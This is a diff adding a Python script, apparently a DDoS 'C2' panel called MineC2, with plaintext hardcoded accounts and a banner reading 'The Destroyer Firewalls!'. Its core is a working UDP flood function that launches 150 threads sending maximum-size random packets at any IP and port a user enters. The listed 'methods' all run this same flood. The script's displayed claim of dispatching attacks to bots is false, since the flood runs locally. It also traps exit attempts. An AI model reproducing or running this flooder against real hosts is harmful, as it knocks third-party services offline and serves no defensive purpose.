@@ -1,0 +1,168 @@
+import os
+import socket
+import threading
+import random
+import time
+import sys
+
+# Colores ANSI
+RED = '\033[91m'
+WHITE = '\033[97m'
+GRAY = '\033[90m'
+RESET = '\033[0m'
+
+# Configuración de cuentas
+accounts = {
+    "apsx": {"password": "apsxnew", "bots": 95, "bytes": 65507},
+    "asky": {"password": "asky", "bots": 70, "bytes": 65507}
+}
+
+# Banner ASCII con colores divididos rojo/blanco
+ascii_art = f"""
+{RED}     .ed"""" """${WHITE}$$$be.
+{RED}     -"           ^""**${WHITE}$$$e.
+{RED}   ."                   '${WHITE}$$c
+{RED}  /                      "4${WHITE}$$b
+{RED} d  3                      $${WHITE}$$
+{RED} $  *                   .$$${WHITE}$$$
+{RED}.$  ^c           $$$$$e$$${WHITE}$$$$$.
+{RED}d$L  4.         4$$$$$$${WHITE}$$$$$$b
+{RED}$$$$b ^ceeeee.  4$$ECL.F${WHITE}*$$$$$$$
+{RED}$$$$P d$$$$F $ $$$$$$$$${WHITE}- $$$$$$
+{RED}3$$$F "$$$$b   $"$$$$$$${WHITE}  $$$$*"
+{RED} $$P"  "$$b   .$ $$$$$..${WHITE}.e$$
+{RED}  *c    ..    $$ 3$$$$$${WHITE}$$$eF
+{RED}    %ce""    $$$  $$$$$${WHITE}$$$$*
+{RED}     *$e.    *** d$$$$$"${WHITE}L$$
+{RED}      $$$      4J$$$$$% ${WHITE}$$$
+{RED}     $"'$=e....$*$$**$cz${WHITE}$$"
+{RED}     $  *=%4.$ L L$ P3${WHITE}$$$F
+{RED}     $   "%*ebJLzb$e$$${WHITE}$$b
+{RED}      %..      4$$$$$$${WHITE}$$$
+{RED}       $$$e   z$$$$$$${WHITE}$$$
+{RED}        "*$c  "$$$$$$${WHITE}P"
+{RED}          """*$$$$$$${WHITE}"
+{WHITE}
+        The Destroyer Firewalls!
+        Dev: [Learn & Vyxint]
+{RESET}
+Type 'help' for commands
+"""
+
+# Limpiar pantalla
+def clear():
+    os.system("cls" if os.name == "nt" else "clear")
+
+# Establecer título
+def set_title(username, bots, running):
+    title = f"MineC2 | user: {username} | bots: {bots} | Runnings: {running}"
+    if os.name == 'nt':
+        os.system(f"title {title}")
+    else:
+        print(f"\33]0;{title}\a", end='', flush=True)
+
+# Ataque UDP
+def udp_attack(ip, port, duration, packet_size):
+    timeout = time.time() + duration
+    message = random._urandom(packet_size)
+
+    def send():
+        while time.time() < timeout:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576)
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                sock.sendto(message, (ip, port))
+                sock.close()
+            except Exception:
+                pass
+
+    threads = []
+    for _ in range(150):
+        t = threading.Thread(target=send)
+        t.start()
+        threads.append(t)
+
+    for t in threads:
+        t.join()
+
+# Programa principal
+def main():
+    clear()
+    while True:
+        username = input(f"{WHITE}username: {RESET}").strip()
+        password = input(f"{WHITE}password: {RESET}").strip()
+
+        if username in accounts and accounts[username]["password"] == password:
+            break
+        else:
+            print(f"{RED}Login failed. Please try again.{RESET}")
+
+    clear()
+    bots = accounts[username]["bots"]
+    packet_size = accounts[username]["bytes"]
+    running_attacks = 0
+    print(ascii_art)
+    set_title(username, bots, running_attacks)
+
+    while True:
+        try:
+            cmd = input(f"{RED}MineC2 {WHITE}${RESET} ").strip()
+
+            if cmd == "help":
+                print(f"{WHITE}bots{RESET}\n{WHITE}methods{RESET}")
+            elif cmd == "bots":
+                print(f"{WHITE}{username} has {bots} bots{RESET}")
+            elif cmd == "methods":
+                print(f"{WHITE}.udphex <ip> <port> <time>")
+                print(f".udpraw <ip> <port> <time>")
+                print(f".tcpbypass <ip> <port> <time>")
+                print(f".udpbypass <ip> <port> <time>")
+                print(f".tcproxies <ip> <port> <time>{RESET}")
+            elif cmd.startswith("."):
+                parts = cmd.split()
+                if len(parts) != 4:
+                    print(f"{RED}Usage: <method> <ip> <port> <time>{RESET}")
+                    continue
+
+                method, ip, port_str, time_str = parts
+                if method not in [".udphex", ".udpraw", ".tcpbypass", ".udpbypass", ".tcproxies"]:
+                    print(f"{RED}Invalid method. Type 'methods' to see available.{RESET}")
+                    continue
+
+                try:
+                    port = int(port_str)
+                    duration = int(time_str)
+                except ValueError:
+                    print(f"{RED}Invalid port or time.{RESET}")
+                    continue
+
+                running_attacks += 1
+                bots -= 1
+                set_title(username, bots, running_attacks)
+
+                print(f"{GRAY}> {WHITE}Method {GRAY}:{WHITE} {method[1:]}")
+                print(f"{GRAY}> {WHITE}Target {GRAY}:{WHITE} {ip}")
+                print(f"{GRAY}> {WHITE}Port {GRAY}:{WHITE} {port}")
+                print(f"{RED}attack sent to {bots + 1} bots{RESET}")
+
+                udp_attack(ip, port, duration, packet_size)
+
+                running_attacks -= 1
+                bots += 1
+                set_title(username, bots, running_attacks)
+
+            else:
+                print(f"{RED}Unknown command. Type 'help'.{RESET}")
+        except KeyboardInterrupt:
+            print(f"\n{RED}No puedes salirte del servidor.{RESET}")
+        except Exception as e:
+            print(f"{RED}Error: {e}{RESET}")
+
+if __name__ == "__main__":
+    try:
+        main()
+    except (KeyboardInterrupt, SystemExit):
+        print(f"\n{RED}No puedes salirte del servidor.{RESET}")
+        while True:
+            time.sleep(1)
